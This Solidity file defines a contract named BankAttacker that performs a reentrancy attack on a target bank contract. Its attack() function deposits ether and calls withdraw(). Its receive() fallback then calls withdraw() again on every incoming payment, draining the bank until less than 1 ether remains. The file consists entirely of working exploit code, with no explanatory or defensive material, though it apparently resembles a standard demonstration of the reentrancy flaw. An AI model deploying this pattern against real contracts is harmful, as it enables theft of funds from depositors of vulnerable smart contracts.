// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

contract BankAttacker {
    IBank public bank;

    constructor(address bankAddress) {
        bank = IBank(bankAddress);
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if(address(bank).balance < 1 ether) return;
        bank.withdraw();
    }

    
}